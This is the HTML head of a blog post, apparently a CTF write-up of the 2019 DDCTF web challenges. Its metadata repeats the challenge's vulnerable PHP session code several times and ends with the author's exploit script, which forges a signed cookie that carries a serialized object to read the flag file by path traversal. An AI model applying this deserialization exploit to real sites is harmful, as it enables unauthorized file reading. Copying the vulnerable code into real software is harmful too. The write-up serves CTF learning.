<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>2019 DDCTF web | ch3n9w の 超元域</title>
<meta name="keywords" content="">
<meta name="description" content="考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。
web 签到题
点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。
然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：

&lt;?php
Class Application {
  var $path = &#39;&#39;;


  public function response($data, $errMsg = &#39;success&#39;) {
      $ret = [&#39;errMsg&#39; =&gt; $errMsg,
          &#39;data&#39; =&gt; $data];
      $ret = json_encode($ret);
      header(&#39;Content-type: application/json&#39;);
      echo $ret;

  }

  public function auth() {
      $DIDICTF_ADMIN = &#39;admin&#39;;
      if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) {
          $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;);
          return TRUE;
      }else{
          $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;);
          exit();
      }

  }
  private function sanitizepath($path) {
  $path = trim($path);//去掉空格
  $path=str_replace(&#39;../&#39;,&#39;&#39;,$path);//过滤第一
  $path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);//过滤第二
  return $path;
}//

public function __destruct() {
  if(empty($this-&gt;path)) {
      exit();
  }else{
      $path = $this-&gt;sanitizepath($this-&gt;path);// ....//config/flag.php
      if(strlen($path) !== 18) {//../config/flag.php
          exit();
      }
      $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;);
  }
  exit();
}
}
?&gt;


&lt;?php
include &#39;Application.php&#39;;
class Session extends Application {

  //key建议为8位字符串
  var $eancrykey                  = &#39;&#39;;
  var $cookie_expiration			= 7200;
  var $cookie_name                = &#39;ddctf_id&#39;;
  var $cookie_path				= &#39;&#39;;
  var $cookie_domain				= &#39;&#39;;
  var $cookie_secure				= FALSE;
  var $activity                   = &#34;DiDiCTF&#34;;


  public function index()
  {
	if(parent::auth()) {
          $this-&gt;get_key();
          if($this-&gt;session_read()) {
              $data = &#39;DiDI Welcome you %s&#39;;
              $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]);
              parent::response($data,&#39;sucess&#39;);
          }else{
              $this-&gt;session_create();
              $data = &#39;DiDI Welcome you&#39;;
              parent::response($data,&#39;sucess&#39;);
          }
      }

  }

  private function get_key() {
      //eancrykey  and flag under the folder
      $this-&gt;eancrykey =  file_get_contents(&#39;../config/key.txt&#39;);
  }

  public function session_read() {//target1: 绕过所有false
      if(empty($_COOKIE)) {
           return FALSE;
      }//cookie not empty

      $session = $_COOKIE[$this-&gt;cookie_name];
      if(!isset($session)) {
          parent::response(&#34;session not found&#34;,&#39;error&#39;);
          return FALSE;
      }//ddctf_id 不能为空

      $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容
      $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位

      if($hash !== md5($this-&gt;eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容
          parent::response(&#34;the cookie data not match&#34;,&#39;error&#39;);
          return FALSE;
      }
      $session = unserialize($session);//ddctf_id 反序列化


      if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){
          return FALSE;
      }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??

      if(!empty($_POST[&#34;nickname&#34;])) {
          $arr = array($_POST[&#34;nickname&#34;],$this-&gt;eancrykey);
          $data = &#34;Welcome my friend %s&#34;;
          foreach ($arr as $k =&gt; $v) {
              $data = sprintf($data,$v);
          }
          parent::response($data,&#34;Welcome&#34;);
      }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。

      if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) {
          parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;);
          return FALSE;
      }//ip_address 要写自己的ip

      if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) {
          parent::response(&#39;the user agent not match&#39;,&#39;error&#39;);
          return FALSE;
      }//user_agent 内容要和 http_user_agent的匹配
      return TRUE;

  }//看起来可以动手脚的只有session_id?

  private function session_create() {
      $sessionid = &#39;&#39;;
      while(strlen($sessionid) &lt; 32) {
          $sessionid .= mt_rand(0,mt_getrandmax());
      }

      $userdata = array(
          &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)),
          &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;],
          &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;],
          &#39;user_data&#39; =&gt; &#39;&#39;,
      );

      $cookiedata = serialize($
  );
      $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
      $expire = $this-&gt;cookie_expiration &#43; time();
      setcookie(
          $this-&gt;cookie_name,
          $cookiedata,
          $expire,
          $this-&gt;cookie_path,
          $this-&gt;cookie_domain,
          $this-&gt;cookie_secure
          );

  }
}


$ddctf = new Session();
$ddctf-&gt;index();
?&gt;
得到key之后构造ddctfid:">
<meta name="author" content="ch3n9w">
<link rel="canonical" href="http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://blog.dragonbox.top/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://blog.dragonbox.top/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="http://blog.dragonbox.top/flash.ico">
<link rel="apple-touch-icon" href="http://blog.dragonbox.top/flash.ico">
<link rel="mask-icon" href="http://blog.dragonbox.top/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="2019 DDCTF web" />
<meta property="og:description" content="考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。
web 签到题
点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。
然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：

&lt;?php
Class Application {
  var $path = &#39;&#39;;


  public function response($data, $errMsg = &#39;success&#39;) {
      $ret = [&#39;errMsg&#39; =&gt; $errMsg,
          &#39;data&#39; =&gt; $data];
      $ret = json_encode($ret);
      header(&#39;Content-type: application/json&#39;);
      echo $ret;

  }

  public function auth() {
      $DIDICTF_ADMIN = &#39;admin&#39;;
      if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) {
          $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;);
          return TRUE;
      }else{
          $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;);
          exit();
      }

  }
  private function sanitizepath($path) {
  $path = trim($path);//去掉空格
  $path=str_replace(&#39;../&#39;,&#39;&#39;,$path);//过滤第一
  $path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);//过滤第二
  return $path;
}//

public function __destruct() {
  if(empty($this-&gt;path)) {
      exit();
  }else{
      $path = $this-&gt;sanitizepath($this-&gt;path);// ....//config/flag.php
      if(strlen($path) !== 18) {//../config/flag.php
          exit();
      }
      $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;);
  }
  exit();
}
}
?&gt;


&lt;?php
include &#39;Application.php&#39;;
class Session extends Application {

  //key建议为8位字符串
  var $eancrykey                  = &#39;&#39;;
  var $cookie_expiration			= 7200;
  var $cookie_name                = &#39;ddctf_id&#39;;
  var $cookie_path				= &#39;&#39;;
  var $cookie_domain				= &#39;&#39;;
  var $cookie_secure				= FALSE;
  var $activity                   = &#34;DiDiCTF&#34;;


  public function index()
  {
	if(parent::auth()) {
          $this-&gt;get_key();
          if($this-&gt;session_read()) {
              $data = &#39;DiDI Welcome you %s&#39;;
              $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]);
              parent::response($data,&#39;sucess&#39;);
          }else{
              $this-&gt;session_create();
              $data = &#39;DiDI Welcome you&#39;;
              parent::response($data,&#39;sucess&#39;);
          }
      }

  }

  private function get_key() {
      //eancrykey  and flag under the folder
      $this-&gt;eancrykey =  file_get_contents(&#39;../config/key.txt&#39;);
  }

  public function session_read() {//target1: 绕过所有false
      if(empty($_COOKIE)) {
           return FALSE;
      }//cookie not empty

      $session = $_COOKIE[$this-&gt;cookie_name];
      if(!isset($session)) {
          parent::response(&#34;session not found&#34;,&#39;error&#39;);
          return FALSE;
      }//ddctf_id 不能为空

      $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容
      $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位

      if($hash !== md5($this-&gt;eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容
          parent::response(&#34;the cookie data not match&#34;,&#39;error&#39;);
          return FALSE;
      }
      $session = unserialize($session);//ddctf_id 反序列化


      if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){
          return FALSE;
      }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??

      if(!empty($_POST[&#34;nickname&#34;])) {
          $arr = array($_POST[&#34;nickname&#34;],$this-&gt;eancrykey);
          $data = &#34;Welcome my friend %s&#34;;
          foreach ($arr as $k =&gt; $v) {
              $data = sprintf($data,$v);
          }
          parent::response($data,&#34;Welcome&#34;);
      }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。

      if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) {
          parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;);
          return FALSE;
      }//ip_address 要写自己的ip

      if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) {
          parent::response(&#39;the user agent not match&#39;,&#39;error&#39;);
          return FALSE;
      }//user_agent 内容要和 http_user_agent的匹配
      return TRUE;

  }//看起来可以动手脚的只有session_id?

  private function session_create() {
      $sessionid = &#39;&#39;;
      while(strlen($sessionid) &lt; 32) {
          $sessionid .= mt_rand(0,mt_getrandmax());
      }

      $userdata = array(
          &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)),
          &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;],
          &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;],
          &#39;user_data&#39; =&gt; &#39;&#39;,
      );

      $cookiedata = serialize($
  );
      $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
      $expire = $this-&gt;cookie_expiration &#43; time();
      setcookie(
          $this-&gt;cookie_name,
          $cookiedata,
          $expire,
          $this-&gt;cookie_path,
          $this-&gt;cookie_domain,
          $this-&gt;cookie_secure
          );

  }
}


$ddctf = new Session();
$ddctf-&gt;index();
?&gt;
得到key之后构造ddctfid:" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/" />
<meta property="og:image" content="http://blog.dragonbox.top/image-20211114142123083.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-05-11T13:58:05+00:00" />
<meta property="article:modified_time" content="2019-05-11T13:58:05+00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://blog.dragonbox.top/image-20211114142123083.png" />
<meta name="twitter:title" content="2019 DDCTF web"/>
<meta name="twitter:description" content="考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。
web 签到题
点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。
然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：

&lt;?php
Class Application {
  var $path = &#39;&#39;;


  public function response($data, $errMsg = &#39;success&#39;) {
      $ret = [&#39;errMsg&#39; =&gt; $errMsg,
          &#39;data&#39; =&gt; $data];
      $ret = json_encode($ret);
      header(&#39;Content-type: application/json&#39;);
      echo $ret;

  }

  public function auth() {
      $DIDICTF_ADMIN = &#39;admin&#39;;
      if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) {
          $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;);
          return TRUE;
      }else{
          $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;);
          exit();
      }

  }
  private function sanitizepath($path) {
  $path = trim($path);//去掉空格
  $path=str_replace(&#39;../&#39;,&#39;&#39;,$path);//过滤第一
  $path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);//过滤第二
  return $path;
}//

public function __destruct() {
  if(empty($this-&gt;path)) {
      exit();
  }else{
      $path = $this-&gt;sanitizepath($this-&gt;path);// ....//config/flag.php
      if(strlen($path) !== 18) {//../config/flag.php
          exit();
      }
      $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;);
  }
  exit();
}
}
?&gt;


&lt;?php
include &#39;Application.php&#39;;
class Session extends Application {

  //key建议为8位字符串
  var $eancrykey                  = &#39;&#39;;
  var $cookie_expiration			= 7200;
  var $cookie_name                = &#39;ddctf_id&#39;;
  var $cookie_path				= &#39;&#39;;
  var $cookie_domain				= &#39;&#39;;
  var $cookie_secure				= FALSE;
  var $activity                   = &#34;DiDiCTF&#34;;


  public function index()
  {
	if(parent::auth()) {
          $this-&gt;get_key();
          if($this-&gt;session_read()) {
              $data = &#39;DiDI Welcome you %s&#39;;
              $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]);
              parent::response($data,&#39;sucess&#39;);
          }else{
              $this-&gt;session_create();
              $data = &#39;DiDI Welcome you&#39;;
              parent::response($data,&#39;sucess&#39;);
          }
      }

  }

  private function get_key() {
      //eancrykey  and flag under the folder
      $this-&gt;eancrykey =  file_get_contents(&#39;../config/key.txt&#39;);
  }

  public function session_read() {//target1: 绕过所有false
      if(empty($_COOKIE)) {
           return FALSE;
      }//cookie not empty

      $session = $_COOKIE[$this-&gt;cookie_name];
      if(!isset($session)) {
          parent::response(&#34;session not found&#34;,&#39;error&#39;);
          return FALSE;
      }//ddctf_id 不能为空

      $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容
      $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位

      if($hash !== md5($this-&gt;eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容
          parent::response(&#34;the cookie data not match&#34;,&#39;error&#39;);
          return FALSE;
      }
      $session = unserialize($session);//ddctf_id 反序列化


      if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){
          return FALSE;
      }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??

      if(!empty($_POST[&#34;nickname&#34;])) {
          $arr = array($_POST[&#34;nickname&#34;],$this-&gt;eancrykey);
          $data = &#34;Welcome my friend %s&#34;;
          foreach ($arr as $k =&gt; $v) {
              $data = sprintf($data,$v);
          }
          parent::response($data,&#34;Welcome&#34;);
      }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。

      if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) {
          parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;);
          return FALSE;
      }//ip_address 要写自己的ip

      if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) {
          parent::response(&#39;the user agent not match&#39;,&#39;error&#39;);
          return FALSE;
      }//user_agent 内容要和 http_user_agent的匹配
      return TRUE;

  }//看起来可以动手脚的只有session_id?

  private function session_create() {
      $sessionid = &#39;&#39;;
      while(strlen($sessionid) &lt; 32) {
          $sessionid .= mt_rand(0,mt_getrandmax());
      }

      $userdata = array(
          &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)),
          &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;],
          &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;],
          &#39;user_data&#39; =&gt; &#39;&#39;,
      );

      $cookiedata = serialize($
  );
      $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
      $expire = $this-&gt;cookie_expiration &#43; time();
      setcookie(
          $this-&gt;cookie_name,
          $cookiedata,
          $expire,
          $this-&gt;cookie_path,
          $this-&gt;cookie_domain,
          $this-&gt;cookie_secure
          );

  }
}


$ddctf = new Session();
$ddctf-&gt;index();
?&gt;
得到key之后构造ddctfid:"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://blog.dragonbox.top/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "2019 DDCTF web",
      "item": "http://blog.dragonbox.top/posts/ctf-2019-ddctf-web/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "2019 DDCTF web",
  "name": "2019 DDCTF web",
  "description": "考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。\nweb 签到题 点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。\n然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：\n\u0026lt;?php Class Application { var $path = \u0026#39;\u0026#39;; public function response($data, $errMsg = \u0026#39;success\u0026#39;) { $ret = [\u0026#39;errMsg\u0026#39; =\u0026gt; $errMsg, \u0026#39;data\u0026#39; =\u0026gt; $data]; $ret = json_encode($ret); header(\u0026#39;Content-type: application/json\u0026#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = \u0026#39;admin\u0026#39;; if(!empty($_SERVER[\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;]) \u0026amp;\u0026amp; $_SERVER[\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;] == $DIDICTF_ADMIN) { $this-\u0026gt;response(\u0026#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php\u0026#39;); return TRUE; }else{ $this-\u0026gt;response(\u0026#39;抱歉，您没有登陆权限，请获取权限后访问-----\u0026#39;,\u0026#39;error\u0026#39;); exit(); } } private function sanitizepath($path) { $path = trim($path);//去掉空格 $path=str_replace(\u0026#39;../\u0026#39;,\u0026#39;\u0026#39;,$path);//过滤第一 $path=str_replace(\u0026#39;..\\\\\u0026#39;,\u0026#39;\u0026#39;,$path);//过滤第二 return $path; }// public function __destruct() { if(empty($this-\u0026gt;path)) { exit(); }else{ $path = $this-\u0026gt;sanitizepath($this-\u0026gt;path);// ....//config/flag.php if(strlen($path) !== 18) {//../config/flag.php exit(); } $this-\u0026gt;response($data=file_get_contents($path),\u0026#39;Congratulations\u0026#39;); } exit(); } } ?\u0026gt; \u0026lt;?php include \u0026#39;Application.php\u0026#39;; class Session extends Application { //key建议为8位字符串 var $eancrykey = \u0026#39;\u0026#39;; var $cookie_expiration\t= 7200; var $cookie_name = \u0026#39;ddctf_id\u0026#39;; var $cookie_path\t= \u0026#39;\u0026#39;; var $cookie_domain\t= \u0026#39;\u0026#39;; var $cookie_secure\t= FALSE; var $activity = \u0026#34;DiDiCTF\u0026#34;; public function index() { if(parent::auth()) { $this-\u0026gt;get_key(); if($this-\u0026gt;session_read()) { $data = \u0026#39;DiDI Welcome you %s\u0026#39;; $data = sprintf($data,$_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]); parent::response($data,\u0026#39;sucess\u0026#39;); }else{ $this-\u0026gt;session_create(); $data = \u0026#39;DiDI Welcome you\u0026#39;; parent::response($data,\u0026#39;sucess\u0026#39;); } } } private function get_key() { //eancrykey and flag under the folder $this-\u0026gt;eancrykey = file_get_contents(\u0026#39;../config/key.txt\u0026#39;); } public function session_read() {//target1: 绕过所有false if(empty($_COOKIE)) { return FALSE; }//cookie not empty $session = $_COOKIE[$this-\u0026gt;cookie_name]; if(!isset($session)) { parent::response(\u0026#34;session not found\u0026#34;,\u0026#39;error\u0026#39;); return FALSE; }//ddctf_id 不能为空 $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容 $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位 if($hash !== md5($this-\u0026gt;eancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容 parent::response(\u0026#34;the cookie data not match\u0026#34;,\u0026#39;error\u0026#39;); return FALSE; } $session = unserialize($session);//ddctf_id 反序列化 if(!is_array($session) OR !isset($session[\u0026#39;session_id\u0026#39;]) OR !isset($session[\u0026#39;ip_address\u0026#39;]) OR !isset($session[\u0026#39;user_agent\u0026#39;])){ return FALSE; }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path?? if(!empty($_POST[\u0026#34;nickname\u0026#34;])) { $arr = array($_POST[\u0026#34;nickname\u0026#34;],$this-\u0026gt;eancrykey); $data = \u0026#34;Welcome my friend %s\u0026#34;; foreach ($arr as $k =\u0026gt; $v) { $data = sprintf($data,$v); } parent::response($data,\u0026#34;Welcome\u0026#34;); }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。 if($session[\u0026#39;ip_address\u0026#39;] != $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) { parent::response(\u0026#39;the ip addree not match\u0026#39;.\u0026#39;error\u0026#39;); return FALSE; }//ip_address 要写自己的ip if($session[\u0026#39;user_agent\u0026#39;] != $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]) { parent::response(\u0026#39;the user agent not match\u0026#39;,\u0026#39;error\u0026#39;); return FALSE; }//user_agent 内容要和 http_user_agent的匹配 return TRUE; }//看起来可以动手脚的只有session_id? private function session_create() { $sessionid = \u0026#39;\u0026#39;; while(strlen($sessionid) \u0026lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( \u0026#39;session_id\u0026#39; =\u0026gt; md5(uniqid($sessionid,TRUE)), \u0026#39;ip_address\u0026#39; =\u0026gt; $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;], \u0026#39;user_agent\u0026#39; =\u0026gt; $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;], \u0026#39;user_data\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); $cookiedata = serialize($ ); $cookiedata = $cookiedata.md5($this-\u0026gt;eancrykey.$cookiedata); $expire = $this-\u0026gt;cookie_expiration + time(); setcookie( $this-\u0026gt;cookie_name, $cookiedata, $expire, $this-\u0026gt;cookie_path, $this-\u0026gt;cookie_domain, $this-\u0026gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-\u0026gt;index(); ?\u0026gt; 得到key之后构造ddctfid:\n",
  "keywords": [
    
  ],
  "articleBody": "考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。\nweb 签到题 点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。\n然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：\n\u003c?php Class Application { var $path = ''; public function response($data, $errMsg = 'success') { $ret = ['errMsg' =\u003e $errMsg, 'data' =\u003e $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) \u0026\u0026 $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) { $this-\u003eresponse('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; }else{ $this-\u003eresponse('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); } } private function sanitizepath($path) { $path = trim($path);//去掉空格 $path=str_replace('../','',$path);//过滤第一 $path=str_replace('..\\\\','',$path);//过滤第二 return $path; }// public function __destruct() { if(empty($this-\u003epath)) { exit(); }else{ $path = $this-\u003esanitizepath($this-\u003epath);// ....//config/flag.php if(strlen($path) !== 18) {//../config/flag.php exit(); } $this-\u003eresponse($data=file_get_contents($path),'Congratulations'); } exit(); } } ?\u003e \u003c?php include 'Application.php'; class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration\t= 7200; var $cookie_name = 'ddctf_id'; var $cookie_path\t= ''; var $cookie_domain\t= ''; var $cookie_secure\t= FALSE; var $activity = \"DiDiCTF\"; public function index() { if(parent::auth()) { $this-\u003eget_key(); if($this-\u003esession_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this-\u003esession_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this-\u003eeancrykey = file_get_contents('../config/key.txt'); } public function session_read() {//target1: 绕过所有false if(empty($_COOKIE)) { return FALSE; }//cookie not empty $session = $_COOKIE[$this-\u003ecookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; }//ddctf_id 不能为空 $hash = substr($session,strlen($session)-32);//长度要大于32? 32位之后的内容 $session = substr($session,0,strlen($session)-32);//一直截断到倒数第32位 if($hash !== md5($this-\u003eeancrykey.$session)) {//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容 parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session);//ddctf_id 反序列化 if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; }//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path?? if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this-\u003eeancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =\u003e $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。 if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { parent::response('the ip addree not match'.'error'); return FALSE; }//ip_address 要写自己的ip if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; }//user_agent 内容要和 http_user_agent的匹配 return TRUE; }//看起来可以动手脚的只有session_id? private function session_create() { $sessionid = ''; while(strlen($sessionid) \u003c 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( 'session_id' =\u003e md5(uniqid($sessionid,TRUE)), 'ip_address' =\u003e $_SERVER['REMOTE_ADDR'], 'user_agent' =\u003e $_SERVER['HTTP_USER_AGENT'], 'user_data' =\u003e '', ); $cookiedata = serialize($ ); $cookiedata = $cookiedata.md5($this-\u003eeancrykey.$cookiedata); $expire = $this-\u003ecookie_expiration + time(); setcookie( $this-\u003ecookie_name, $cookiedata, $expire, $this-\u003ecookie_path, $this-\u003ecookie_domain, $this-\u003ecookie_secure ); } } $ddctf = new Session(); $ddctf-\u003eindex(); ?\u003e 得到key之后构造ddctfid:\n\u003c?php //nickname = %s $a = 'a:4:{s:10:\"session_id\";s:32:\"3f65fc339c032f85048e42f21fab4ef0\";s:10:\"ip_address\";s:14:\"211.137.22.191\";s:10:\"user_agent\";s:78:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\";s:9:\"user_data\";s:0:\"\";}'; $b = unserialize($a); class Application{ public $path = '....//config/flag.txt'; } $key = 'EzblrbNS'; $b['user_data'] = new Application; $d = serialize($b); echo urlencode($d.md5($key.$d)); 